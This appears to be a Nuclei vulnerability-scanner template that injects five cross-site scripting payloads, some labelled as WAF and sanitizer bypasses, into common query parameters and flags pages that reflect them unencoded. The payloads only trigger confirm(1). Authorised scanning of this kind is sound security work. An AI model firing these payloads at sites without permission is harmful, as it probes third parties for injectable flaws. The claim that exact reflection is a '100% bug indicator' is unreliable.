id: advanced-xss-precision-bypass

info:
  name: Advanced XSS Bypass & Execution Verifier
  author: thenawabx
  severity: high
  description: Targeted at bypassing modern WAFs and sanitizers using SVG, details, and encoding.
  tags: xss, advanced, waf-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/?q={{payload}}"
      - "{{BaseURL}}/?search={{payload}}"
      - "{{BaseURL}}/?id={{payload}}"
      - "{{BaseURL}}/?query={{payload}}"

    payloads:
      payload:
        # 1. SVG-based bypass (Very effective against HTML filters)
        - "<svg/onload=confirm(1)>"
        # 2. Details tag bypass (Often overlooked by WAFs)
        - "<details open ontoggle=confirm(1)>"
        # 3. Image tag with backticks (Bypasses keyword alerts for 'alert')
        - "<img src=x onerror=confirm`1`>"
        # 4. Autofocus bypass
        - "<input autofocus onfocus=confirm(1)>"
        # 5. Script context bypass (For reflection inside existing scripts)
        - "'-confirm(1)-'"

    stop-at-first-match: false
    matchers-condition: and
    matchers:
      # Ensures the payload is reflected exactly without encoding (100% bug indicator)
      - type: word
        part: body
        words:
          - "<svg/onload=confirm(1)>"
          - "<details open ontoggle=confirm(1)>"
          - "<img src=x onerror=confirm`1`>"
        condition: or

      # Ensures the response is HTML
      - type: word
        part: header
        words:
          - "text/html"

      # Ensures a successful server response
      - type: status
        status:
          - 200
